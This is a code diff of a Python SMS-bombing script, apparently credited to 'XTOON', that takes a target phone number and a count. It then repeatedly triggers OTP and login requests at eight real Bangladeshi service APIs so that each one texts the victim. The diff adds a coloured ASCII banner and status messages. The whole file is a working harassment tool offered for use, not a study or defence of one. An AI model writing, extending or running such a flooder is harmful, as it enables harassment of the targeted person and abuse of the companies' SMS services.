@@ -1,5 +1,46 @@
 import requests as rq
-Number = input("Enter Your Target Number : ")
+import os
+import random
+BLACK = "\033[0;30m"
+RED = "\033[0;31m"
+GREEN = "\033[0;32m"
+BROWN = "\033[0;33m"
+BLUE = "\033[0;34m"
+PURPLE = "\033[0;35m"
+CYAN = "\033[0;36m"
+LIGHT_GRAY = "\033[0;37m"
+DARK_GRAY = "\033[1;30m"
+LIGHT_RED = "\033[1;31m"
+LIGHT_GREEN = "\033[1;32m"
+YELLOW = "\033[1;33m"
+LIGHT_BLUE = "\033[1;34m"
+LIGHT_PURPLE = "\033[1;35m"
+LIGHT_CYAN = "\033[1;36m"
+LIGHT_WHITE = "\033[1;37m"
+BOLD = "\033[1m"
+FAINT = "\033[2m"
+ITALIC = "\033[3m"
+UNDERLINE = "\033[4m"
+BLINK = "\033[5m"
+NEGATIVE = "\033[7m"
+CROSSED = "\033[9m"
+end = "\033[0m"
+clr= RED,GREEN,BLUE,YELLOW
+color=random.choice(clr)
+
+logo = f"""
+       {color} ██╗  ██╗████████╗███╗   ██╗{color}
+      {color} ╚██╗██╔╝╚══██╔══╝████╗  ██║{color}
+         ╚███╔╝    ██║   ██╔██╗ ██║
+         ██╔██╗    ██║   ██║╚██╗██║
+        ██╔╝ ██╗   ██║   ██║ ╚████║
+        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝{end}
+              {GREEN} AUTHOR : XTOON{end}
+......IF YOU SENT 1 MASSEGE IT'S MEAN 8.....
+--------------------------------------------
+"""
+print(logo)
+Number = input(f"{LIGHT_BLUE}Enter Your Target Number : ")
 amount = int(input("ENTER YOUR LIMIT : "))
 url1 = 'https://api.osudpotro.com/api/v1/users/send_otp'
 data1 = {"mobile": f"+88-{Number}", "deviceToken": "web", "language": "en", "os": "web"}
@@ -17,46 +58,53 @@ data6 = {"CellPhone":f"{Number}","type":"login"}
 url7 = f"https://www.rokomari.com/otp/send?emailOrPhone=88{Number}&countryCode=BD"
 url8 = "https://api.apex4u.com/api/auth/login"
 data8 = {"phoneNumber":f"{Number}"}
+os.system("clear")
+print(f"""  {color}      ██╗  ██╗████████╗███╗   ██╗
+       ╚██╗██╔╝╚══██╔══╝████╗  ██║
+         ╚███╔╝    ██║   ██╔██╗ ██║
+         ██╔██╗    ██║   ██║╚██╗██║
+        ██╔╝ ██╗   ██║   ██║ ╚████║
+        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝{end}
+{GREEN}--------------------------------------------{RED}
+""")
 for i in range(amount):
-    
     res2 = rq.get(url3)
     if res2.json()['otp_length']==6:
-        print(f" {i+1} SMS SENT FROM BIKROY.COM")
+        print(f" {GREEN} SMS SENT FROM BIKROY.COM{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res1 = rq.post(url2, json=data2)
     if res1.json()['success']==True:
-        print(f" {i+1} SMS SENT FROM OSUDKINI")
+        print(f" {GREEN} SMS SENT FROM OSUDKINI{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res3 = rq.post(url1, json=data1)
     if res3.json()['status']==False:
-        print(f" {i+1} SMS SENT FROM OSUDPOTRO")
+        print(f" {GREEN} SMS SENT FROM OSUDPOTRO{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res4 = rq.post(url4,json=data4)
     if res4.json()["success"]==True:
-        print(f" {i+1} SMS SENT FROM MEDHA")
+        print(f" {GREEN} SMS SENT FROM MEDHA{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res5 = rq.post(url5,data=data5)
     if res5.json()["status"]=="success":
-        print(f" {i+1} SMS SENT FROM AROGGA")
+        print(f"  {GREEN}SMS SENT FROM AROGGA{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res6 = rq.post(url6,json=data6)
     if res6.status_code == 200 or 201:
-        print(f" {i+1} SMS SENT FROM MEENA BAZAR")
+        print(f" {GREEN} SMS SENT FROM MEENA BAZAR{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res7 = rq.post(url7)
     if res7.status_code == 200:
-        print(f" {i+1} SMS SENT FROM ROKOMARI")
+        print(f" {GREEN} SMS SENT FROM ROKOMARI{end} ")
     else:
-        print("NETWORK ERROR")
+        print(f"  {RED}NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
     res8 = rq.post(url8)
     if res8.status_code == 200:
-        print(f" {i+1} SMS SENT FROM APEX")
+        print(f" {GREEN} SMS SENT FROM APEX{end} ")
     else:
-        print("NETWORK ERROR")
-
+        print(f"{RED}  NETWORK ERROR{end} OR {RED}LIMITATION{end} ")
